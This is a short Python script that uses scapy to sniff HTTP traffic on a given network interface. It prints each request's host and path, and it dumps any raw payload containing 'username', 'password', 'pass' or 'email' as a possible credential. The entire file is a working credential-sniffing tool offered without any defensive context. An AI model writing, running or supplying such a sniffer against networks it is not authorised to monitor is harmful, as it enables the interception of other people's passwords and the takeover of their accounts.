import scapy.all as scapy
import argparse
from scapy.layers import http

def get_interface():
    parser = argparse.ArgumentParser(description="Packet Sniffer")
    parser.add_argument("-i", "--interface", dest="interface", help="Interface to sniff on", required=True)
    args = parser.parse_args()
    return args.interface

def spoof(iface):
    print(f"Sniffing on {iface}...")
    scapy.sniff(iface=iface, store=False, prn=process_packet)
    
def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print("[+] HTTP Request >> " + packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode())
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keys = ["username", "password", "pass", "email"]
            for key in keys:
                if key.encode() in load: 
                    print("[+] Possible password/username >> " + load.decode(errors="ignore"))
                    break

iface = get_interface()
spoof(iface)